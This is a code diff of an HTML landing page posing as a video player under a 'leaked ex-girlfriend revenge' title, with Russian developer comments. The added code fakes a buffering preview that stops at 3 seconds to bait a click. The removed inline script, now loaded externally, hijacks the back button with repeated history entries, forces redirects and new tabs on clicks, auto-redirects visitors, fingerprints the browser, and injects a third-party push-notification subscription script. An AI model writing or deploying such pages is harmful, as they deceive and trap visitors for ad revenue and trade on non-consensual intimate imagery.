@@ -1,8 +1,6 @@
 <!doctype html>
 <html data-version="production-archive-v0.0.123" data-landing-name="player" lang="">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0" />
 
   <!-- APP CONFIG -->
   <script>
@@ -80,6 +78,10 @@
   })();
   </script>
 
+  <!-- META -->
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0" />
+
   <title>LEAKED Homemade Tapes 2025 | Real Ex-GF Revenge 🔥</title>
   <meta name="description" content="Continue watching" />
 
@@ -87,164 +89,40 @@
   <link rel="alternate icon" type="image/png" href="./assets/favicon/favicon-play.png">
   <link rel="manifest" href="./assets/favicon/site.webmanifest" />
 
-  <!-- CDN warmup -->
-  <link rel="preconnect" href="https://cdn.x0x.online" crossorigin>
-  <link rel="dns-prefetch" href="//cdn.x0x.online">
+  <link rel="stylesheet" href="./assets/styles/style.css">
+  <script defer src="./assets/scripts/common.js"></script>
 
-  <!-- INLINE CSS (вместо ./assets/styles/style.css) -->
-  <style>
-    :root {
-      --bg: #000;
-      --fg: #fff;
-      --muted: rgba(255,255,255,0.65);
-      --shadow: rgba(0,0,0,0.65);
-      --bar: rgba(0,0,0,0.55);
-      --bar2: rgba(0,0,0,0.75);
-    }
-    html, body {
-      margin: 0;
-      padding: 0;
-      height: 100%;
-      width: 100%;
-      background: var(--bg);
-      color: var(--fg);
-      font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
-      overflow: hidden;
-      -webkit-tap-highlight-color: transparent;
-      user-select: none;
-    }
-    .body { background: var(--bg); }
-
-    .xh-player-wrapper {
-      position: relative;
-      width: 100%;
-      height: 100vh;
-      display: flex;
-      flex-direction: column;
-      justify-content: flex-end;
-      background: #000;
-    }
-
-    .xh-fake-player {
-      position: absolute;
-      inset: 0;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      background: #000;
-    }
-
-    .xh-frame {
-      position: absolute;
-      inset: 0;
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-      filter: brightness(0.88);
-      opacity: 0;
-      transition: opacity 180ms ease;
-    }
-    .xh-frame.loaded { opacity: 1; }
-
-    .xh-loader {
-      position: absolute;
-      width: 66px;
-      height: 66px;
-      border-radius: 50%;
-      border: 4px solid rgba(255,255,255,0.18);
-      border-top-color: rgba(255,255,255,0.95);
-      animation: spin 0.9s linear infinite;
-      display: none;
-      z-index: 3;
-      box-shadow: 0 12px 24px var(--shadow);
-    }
-    @keyframes spin { to { transform: rotate(360deg); } }
-
-    .xh-play-btn {
-      position: relative;
-      z-index: 4;
-      transform: scale(0.96);
-      opacity: 0;
-      pointer-events: none;
-      transition: opacity 180ms ease, transform 180ms ease;
-      filter: drop-shadow(0 16px 25px rgba(0,0,0,0.6));
-    }
-    .xh-play-btn.ready {
-      opacity: 1;
-      pointer-events: auto;
-      transform: scale(1);
-    }
-
-    .xh-bottom-bar {
-      position: absolute;
-      left: 0;
-      right: 0;
-      bottom: 0;
-      padding: 10px 12px 16px;
-      z-index: 6;
-      background: linear-gradient(to top, var(--bar2), transparent 75%);
-    }
-
-    .xh-progress {
-      width: 100%;
-      height: 4px;
-      border-radius: 999px;
-      background: rgba(255,255,255,0.18);
-      overflow: hidden;
-      margin-bottom: 10px;
-    }
-    .xh-progress::after {
-      content: "";
-      display: block;
-      height: 100%;
-      width: 18%;
-      background: rgba(255,255,255,0.85);
-      border-radius: 999px;
-      box-shadow: 0 0 16px rgba(255,255,255,0.35);
-    }
-
-    .xh-controls-row {
-      display: flex;
-      align-items: center;
-      justify-content: space-between;
-      gap: 12px;
-      color: var(--muted);
-      font-size: 14px;
-      letter-spacing: 0.2px;
-    }
-
-    .xh-time { white-space: nowrap; }
-
-    .xh-icons {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      opacity: 0.95;
-    }
-    .xh-icon {
-      width: 22px;
-      height: 22px;
-      fill: rgba(255,255,255,0.75);
-      filter: drop-shadow(0 6px 12px rgba(0,0,0,0.35));
-    }
-  </style>
 </head>
 
 <body class="body">
 
   <div class="xh-player-wrapper">
     <div class="xh-fake-player">
-      <img class="xh-frame" alt="frame" decoding="async" fetchpriority="high">
+
+      <!-- VIDEO вместо кадра-картинки -->
+      <video
+        class="xh-video"
+        playsinline
+        webkit-playsinline
+        muted
+        autoplay
+        preload="auto"
+        poster=""
+      >
+        <source src="./vid.mp4" type="video/mp4">
+      </video>
 
       <!-- LOADER -->
       <div class="xh-loader"></div>
 
+      <!-- PLAY BUTTON (появится после паузы на 3 секунде) -->
       <div class="xh-play-btn">
-        <svg width="140" height="140" viewBox="0 0 140 140" aria-hidden="true">
+        <svg width="140" height="140" viewBox="0 0 140 140">
           <circle cx="70" cy="70" r="68" stroke="white" stroke-width="4" fill="rgba(0,0,0,0.35)"/>
           <polygon points="55,45 105,70 55,95" fill="white"/>
         </svg>
       </div>
+
     </div>
 
     <div class="xh-bottom-bar">
@@ -299,76 +177,77 @@
         .then(x=>{
           window.templateHash=x;
           window.syncMetric && window.syncMetric({event:"template_hash_ready"});
-        })
-        .catch(()=>{});
+        });
     });
   })();
   </script>
 
-  <!-- FRAME LOADER -->
-  <script>
-  (function(){
-    const p = new URLSearchParams(location.search);
-    const cid = p.get("var_2");
-    const cr  = p.get("creative_id");
-    const f   = document.querySelector(".xh-frame");
-
-    if (!f || !cid || !cr) { f && f.remove(); return; }
-
-    const url = `https://cdn.x0x.online/frames/${cid}/${cr}.webp`;
-
-    f.decoding = "async";
-    try { f.fetchPriority = "high"; } catch {}
-
-    f.onload  = () => f.classList.add("loaded");
-    f.onerror = () => { try { f.remove(); } catch {} };
-
-    f.src = url;
-  })();
-  </script>
-
-  <!-- LOADER CONTROL -->
+  <!-- VIDEO PREVIEW CONTROL: автоплей -> стоп на 3с -> показать play -->
   <script>
   document.addEventListener("DOMContentLoaded", () => {
     const loader = document.querySelector(".xh-loader");
-    const play = document.querySelector(".xh-play-btn");
-    const frame = document.querySelector(".xh-frame");
+    const playBtn = document.querySelector(".xh-play-btn");
+    const video = document.querySelector(".xh-video");
 
-    if (!loader || !play) return;
+    if (!video || !loader || !playBtn) return;
 
+    // чтобы кнопка не мелькала до момента паузы
+    playBtn.classList.remove("ready");
     loader.style.display = "flex";
-    play.classList.remove("ready");
 
-    const MIN_DELAY = 700;
-    const MAX_WAIT  = 2500;
-    const start = performance.now();
-    let doneOnce = false;
+    const STOP_AT = 3.0;      // секунда, на которой стопаем
+    const MIN_SPIN = 400;     // минимальный "буферинг" вайб
+    const MAX_WAIT = 2500;    // не висим бесконечно
+    const t0 = performance.now();
+    let stopped = false;
 
-    function done() {
-      if (doneOnce) return;
-      doneOnce = true;
-      const left = Math.max(0, MIN_DELAY - (performance.now() - start));
+    const showPlay = () => {
+      const left = Math.max(0, MIN_SPIN - (performance.now() - t0));
       setTimeout(() => {
         loader.style.display = "none";
-        play.classList.add("ready");
+        playBtn.classList.add("ready");
       }, left);
-    }
+    };
 
-    if (frame && !frame.classList.contains("loaded")) {
-      frame.addEventListener("load", done, { once: true });
-      frame.addEventListener("error", done, { once: true });
-      setTimeout(done, MAX_WAIT);
-    } else {
-      setTimeout(done, MIN_DELAY);
-    }
+    const tryAutoplay = async () => {
+      try {
+        // важно: muted+playsinline, иначе мобилки/десктоп могут заблокировать autoplay
+        await video.play();
+      } catch (e) {
+        // autoplay заблокирован — просто покажем кнопку
+        window.syncMetric && window.syncMetric({ event: "video_autoplay_blocked", errorMessage: String(e && e.message || e) });
+        showPlay();
+      }
+    };
+
+    const onTime = () => {
+      if (stopped) return;
+      if (video.currentTime >= STOP_AT) {
+        stopped = true;
+        try { video.pause(); } catch {}
+        video.removeEventListener("timeupdate", onTime);
+        showPlay();
+        window.syncMetric && window.syncMetric({ event: "video_preview_stopped" });
+      }
+    };
+
+    // Как только есть данные для старта — пускаем и начинаем отслеживать 3 секунду
+    video.addEventListener("playing", () => {
+      loader.style.display = "none"; // видео реально пошло — лоадер можно убрать
+    }, { once: true });
+
+    video.addEventListener("timeupdate", onTime);
+
+    // страховка, если видео не грузится/не стартует
+    setTimeout(() => {
+      if (!stopped && video.readyState < 2) {
+        showPlay();
+        window.syncMetric && window.syncMetric({ event: "video_preview_timeout" });
+      }
+    }, MAX_WAIT);
+
+    tryAutoplay();
   });
-  </script>
-
-  <!-- INLINE common.js (тот самый большой скрипт, чтобы не подключать отдельно) -->
-  <script>
-  (()=>{var e,t,n,a,r=Object.create,o=Object.defineProperty,i=Object.getOwnPropertyDescriptor,l=Object.getOwnPropertyNames,s=Object.getPrototypeOf,c=Object.prototype.hasOwnProperty,u=(t,n,a,r)=>{if(n&&"object"==typeof n||"function"==typeof n)for(let e of l(n))c.call(t,e)||e===a||o(t,e,{get:()=>n[e],enumerable:!(r=i(n,e))||r.enumerable});return t},d=(e,t,n)=>(n=null!=e?r(s(e)):{},u(!t&&e&&e.__esModule?n:o(n,"default",{value:e,enumerable:!0}),e)),m=(e={"src/landings/player/locale/en.json"(e,t){t.exports={no:"No",yes:"Yes",install_app_and_continue_watching:"Install our app and continue watching content in Safe mode",notification:"(1) Notification"}}},function(){return t||(0,e[l(e)[0]])((t={exports:{}}).exports,t),t.exports}),w=async()=>{var e=navigator;if(!e.userAgentData)return"";try{var t=["platformVersion"];return(await e.userAgentData.getHighEntropyValues(t)).platformVersion}catch(e){return console.error("Error retrieving data from navigator.userAgentData",e),""}},h=()=>{if("undefined"!=typeof Intl&&"function"==typeof Intl.DateTimeFormat){var e=Intl.DateTimeFormat().resolvedOptions().timeZone;if(e)return e}return""},v=()=>(new Date).getTimezoneOffset(),p=t=>{let n=new URLSearchParams;return Object.keys(t).forEach(e=>{t[e]&&n.set(e,t[e])}),n},b=new URL(window.location.href),g={pz:null!=(a=b.searchParams.get("pz"))?a:"",tb:null!=(a=b.searchParams.get("tb"))?a:"",tb_reverse:null!=(a=b.searchParams.get("tb_reverse"))?a:"",ae:null!=(a=b.searchParams.get("ae"))?a:"",z:null!=(a=b.searchParams.get("z"))?a:"",var:null!=(a=b.searchParams.get("var"))?a:"",var_1:null!=(a=b.searchParams.get("var_1"))?a:"",var_2:null!=(a=b.searchParams.get("var_2"))?a:"",var_3:null!=(a=b.searchParams.get("var_3"))?a:"",b:null!=(a=b.searchParams.get("b"))?a:"",campaignid:null!=(a=b.searchParams.get("campaignid"))?a:"",abtest:null!=(a=b.searchParams.get("abtest"))?a:"",rhd:null!=(a=b.searchParams.get("rhd"))?a:"1",s:null!=(a=b.searchParams.get("s"))?a:"",ymid:null!=(a=b.searchParams.get("ymid"))?a:"",wua:null!=(a=b.searchParams.get("wua"))?a:"",use_full_list_or_browsers:null!=(a=b.searchParams.get("use_full_list_or_browsers"))?a:"",cid:null!=(a=b.searchParams.get("cid"))?a:"",geo:null!=(a=b.searchParams.get("geo"))?a:""},f=({passParamToParams:e,searchParams:r,windowUrl:o})=>(e.forEach(e=>{var{from:e,to:t,joinWith:n}=e;let a=Array.isArray(e)?e.map(e=>null!=(e=o.searchParams.get(e))?e:"").filter(Boolean).join(null!=n?n:""):null!=(n=o.searchParams.get(e))?n:"";a&&t.forEach(e=>{r.set(e,a)})}),r),y=async({zone:e,passParamToParams:t})=>{var n=h(),a=v(),r=(null==(r=document.querySelector("html"))?void 0:r.getAttribute("data-version"))||"",o=(null==(o=document.querySelector("html"))?void 0:o.getAttribute("data-landing-name"))||"",i=null!=(i=window.templateHash)?i:"",r=JSON.stringify({dataVer:r,landingName:o,templateHash:i}),o=btoa(r),i={pz:g.pz,tb:g.tb,tb_reverse:g.tb_reverse,ae:g.ae,ab2r:g.abtest||String(APP_CONFIG.abtest||"")};let l={ymid:null!=(r=g.var_1)?r:g.var,var:null!=(r=g.var_2)?r:g.z,var_3:g.var_3,b:g.b,campaignid:g.campaignid,click_id:g.s,rhd:g.rhd,os_version:await w(),btz:n.toString(),bto:a.toString(),cmeta:o};e&&(l.zoneid=e),Object.entries(i).forEach(([e,t])=>{t&&(l[e]=t)});r=p(l);return t?f({passParamToParams:t,searchParams:r,windowUrl:new URL(window.location.href)}):r},P=(t,n)=>{try{for(let e=0;e<n;e+=1)window.history.pushState(null,"Please wait...",t);var e=window.location.href;window.history.pushState(null,document.title,e),console.log(`Back initializated ${n} times with `+t)}catch(e){console.error("Failed to push state, error:",e)}},_=async t=>{var t=null==t?void 0:t.back;if(t){var{currentTab:n,pageUrl:a}=t;if(n){var t=null!=(t=t.count)?t:10,{origin:r,pathname:o}=window.location;let e=""+r+o;a?e=a:((e=(e=e.includes("index.html")?e.split("/index.html")[0]:e).includes("back.html")?e.split("/back.html")[0]:e).endsWith("/")&&(e=e.substring(0,e.length-1)),e+="/back.html");r=new URL(e),o=await y({zone:n.zoneId}),a=(n.url?o.set("url",n.url):n.domain&&n.zoneId&&(o.set("z",n.zoneId),o.set("domain",n.domain)),decodeURIComponent(r.toString()+"?"+o.toString()));P(a,t)}}},z=async(e,t,n)=>{t=t.includes("http")?t:"https://"+t,t=new URL(t+"/afu.php"),e=await y({zone:e.toString(),passParamToParams:n}),n=decodeURIComponent(t.toString()+"?"+e.toString());return console.log("URL generated:",n),n},I=({url:e})=>{window.location.replace(e)},T=(e,t)=>{console.error(`${t||"Some exit"} was supposed to work, but some data about this type of exit was missed`,e)},E=async(t,n,a=!0)=>{var r,o=t[n].currentTab;if(console.log(n+" worked",t),o){let e;if(o.zoneId&&o.domain)return null!=(r=window.syncMetric)&&r.call(window,{event:n,exitZoneId:o.zoneId}),e=await z(o.zoneId,o.domain),a&&await _(t),I({url:e});if(o.url)return null!=(r=window.syncMetric)&&r.call(window,{event:n,exitZoneId:o.url}),e=o.url,a&&await _(t),I({url:e})}T(o,n)},O=async(n,a)=>{var r,o,i=n[a];if(console.log(a+" worked",n),i){var{currentTab:l,newTab:s}=i;let e;l&&(l.zoneId&&l.domain?(e=await z(l.zoneId,l.domain),null!=(r=window.syncMetric)&&r.call(window,{event:a,exitZoneId:l.zoneId})):l.url?e=l.url:T(i,a));let t;s&&(s.zoneId&&s.domain?(t=await z(s.zoneId,s.domain),null!=(r=window.syncMetric)&&r.call(window,{event:a,exitZoneId:s.zoneId})):s.url?t=s.url:T(i,a)),await _(n),{currentTabUrl:o,newTabUrl:l}=[{currentTabUrl:e,newTabUrl:t}][0],void(l?(l=window.open(l,"_blank"))&&(l.opener=null,o)&&document.addEventListener("visibilitychange",()=>{"visible"===document.visibilityState&&I({url:o})}):o&&I({url:o}))}else T(i,a)},S=()=>"undefined"!=typeof APP_CONFIG||(document.body.innerHTML=`
-            <p style="">LANDING CAN'T BE RENDERED. 🔔 PLEASE ADD CODE(you can find an object with options in your Propush account) FROM PROPUSH TO HEAD TAG.</p>
-        `,!1),A=["currentTab","newTab"],N=["zoneId","url"],D=r=>{if(S()){let{domain:i,videoCount:e,prizeName:t,prizeImg:n,...a}=r;return{videoCount:e,prizeName:t,prizeImg:n,...Object.entries(a).reduce((e,[t,n])=>{var a,[t,r,o]=t.split("_");return t&&(A.includes(r)?(a=r,N.includes(o)&&(e[t]={...e[t],[a]:{domain:"zoneId"===o?i:void 0,[o]:n}})):N.includes(r)?(a=r,e[t]={...e[t],currentTab:{domain:"zoneId"===a?i:void 0,[a]:n}}):(o=r,e[t]={...e[t],[o]:n})),e},{})}}},j=((async()=>{let i,l=D(APP_CONFIG);if(l){var s=null==l?void 0:l.autoexit;if(null!=s&&s.currentTab){let e=null!=(i=s.timeToRedirect)?i:90,t="visible"===document.visibilityState,n=!1,a=function(){"visible"===document.visibilityState?(t=!0,n&&E(l,"autoexit")):t=!1},r=()=>(document.addEventListener("visibilitychange",a),setTimeout(()=>{n=!0,t&&E(l,"autoexit")},1e3*e)),o=r();s=()=>{clearTimeout(o),document.removeEventListener("visibilitychange",a)};document.addEventListener("mousemove",s),document.addEventListener("click",s),document.addEventListener("scroll",s)}}})(),5184e3),x=async e=>{var t=await y({zone:e.toString()}),n=g.abtest||APP_CONFIG.abtest;return g.ymid&&t.set("var_2",g.ymid),e&&t.set("z",e),g.wua&&t.set("wua",g.wua),n&&(t.set("ab2",String(n)),t.set("ab2_ttl",""+j)),t.set("sw","./sw.js"),t.set("d",location.host),t},b=async({outDomain:n,pushDomain:a,pushZone:r,allowedNew:o,allowedPop:i,subscribedNew:l,subscribedPop:s})=>{var e;(async e=>{var t=await x(r);e.src=`https://${a}/hid.js?`+t,e.onload=function(e){e.zoneId=r,e.events.onPermissionDefault=function(){},e.events.onPermissionAllowed=async function(){o&&window.open(await z(o,n),"_blank"),i&&(window.location.href=await z(i,n))},e.events.onPermissionDenied=function(){},e.events.onAlreadySubscribed=async function(){l&&window.open(await z(l,n),"_blank"),s&&(window.location.href=await z(s,n))},e.events.onNotificationUnsupported=function(){}}})(null==(e=[document.documentElement,document.body].filter(Boolean).pop())?void 0:e.appendChild(document.createElement("script")))},L=((a=D(APP_CONFIG))&&null!=(n=null==(a=a.push)?void 0:a.currentTab)&&n.domain&&null!=(n=null==a?void 0:a.currentTab)&&n.zoneId&&b({outDomain:a.currentTab.domain,pushDomain:"10zon.com",pushZone:a.currentTab.zoneId}),(async()=>{let a=D(APP_CONFIG);if(a){var e=null==a?void 0:a.reverse;let n=!1;null!=e&&e.currentTab&&(window.addEventListener("click",async()=>{try{var e,t;n||(e=window.location.pathname,t=""+e+window.location.search,await _(a),window.history.pushState(null,"",t),n=!0)}catch(e){console.error("Reverse pushStateToHistory error:",e)}},{capture:!0}),window.addEventListener("popstate",()=>{E(a,"reverse",!1)}))}})(),()=>{var e=window.location.search,e=new URLSearchParams(e).get("lang"),t=navigator.language.split("-")[0];return e||t||"en"}),k={},C=async e=>{let t=L();return k[t]||(k[t]=(async()=>{try{return await(await fetch(`./locales/${t}.json`)).json()}catch{return e()}})()),k[t]},R=async()=>Promise.resolve().then(()=>d(m(),1)).then(e=>e.default),U=((async()=>{(async(e,a)=>{var t=L(),t=(document.documentElement.setAttribute("lang",t),["ar","he","fa","ur","az","ku","ff","dv"].includes(t)&&document.documentElement.setAttribute("dir","rtl"),await C(e));let r=[];Object.entries(t).forEach(e=>{var t=e[0];let n=e[1];e=null==a?void 0:a[t],n=e?n.replaceAll(e.macros,e.macrosValue):n,e=document.querySelectorAll(`[data-translate="${t}"]`);null!=e&&e.length?e.forEach(e=>{e&&(e.hasAttribute("data-translate-html")?e.innerHTML=n:(e.childNodes.length||(e.textContent=n),e.childNodes.forEach(e=>{e.nodeType===Node.TEXT_NODE&&(e.nodeValue=n)})))}):r.push(t)}),r.length&&console.warn("Some keys from locales folder weren't used for translation when loading the landing page for the first time:",r.join(", "))})(R)})(),D(APP_CONFIG));U&&document.addEventListener("click",()=>{O(U,"mainExit")})})();
   </script>
 
 </body>
